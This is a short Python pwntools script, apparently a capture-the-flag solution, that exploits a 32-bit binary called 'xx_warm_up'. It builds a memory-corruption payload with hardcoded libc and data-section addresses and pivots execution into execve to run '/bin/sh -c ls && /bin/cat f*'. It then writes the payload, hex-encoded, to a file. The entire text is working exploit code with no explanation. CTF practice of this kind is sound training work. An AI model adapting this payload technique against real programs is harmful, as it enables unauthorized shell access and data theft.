#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
from pwnlib.util.iters import  bruteforce
import hashlib
def hash(x):
    return hashlib.sha256(x).hexdigest()

#libc=ELF("./libc.so.6")
elf = ELF("./xx_warm_up")
libc = ELF("./bc.so.6")
libc.address = 0xf7d82000
#libc.address = 0xf7df6000
#heap_add=0
#stack_add=0
link_map_add = 0x804A040
payload = fit({
    0:"ls && /bin/cat f*\x00",
    0x18:"/bin/sh\x00",
    0x20:"-c\x00",
    0x24:p32(0x804A058)+p32(0x804A060)+p32(0x804A040)+p32(0),
    # esp
    0x40:p32(0x804A08c+4) + p32(0)+ p32(0x804A048),
    0x4c:p32(libc.sym["execve"]),
    0x50:p32(0xdead)+p32(0x804A058)+p32(0x804A064)+p32(0)
},filler="b")

write("input",payload.encode("hex"))
